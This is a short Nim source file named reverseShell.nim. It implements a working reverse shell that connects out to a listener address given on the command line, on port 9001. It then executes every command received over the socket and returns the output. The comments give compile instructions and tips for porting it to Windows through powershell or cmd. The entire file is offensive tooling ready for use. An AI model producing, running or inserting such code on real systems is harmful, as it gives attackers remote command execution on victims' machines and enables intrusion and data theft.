import os
import net
import osproc

# To compile - nim c reverseShell.nim
# Can compile to windows - be sure to change "execProcess" to include powershell or cmd then &
var socket = newSocket()

proc shell(listener: string, port: int): void =

  try:
    socket.connect(listener,PORT(port))

    while true:
      let cmd = socket.recvLine()
      if cmd == "exit":
        break
      let result = execProcess(cmd)
      socket.send(result)

  except:
    raise
  finally:
    socket.close

when isMainModule:
  try:
    let port = 9001
    let listener = paramStr(1)
    shell(listener, port)
  except:
    raise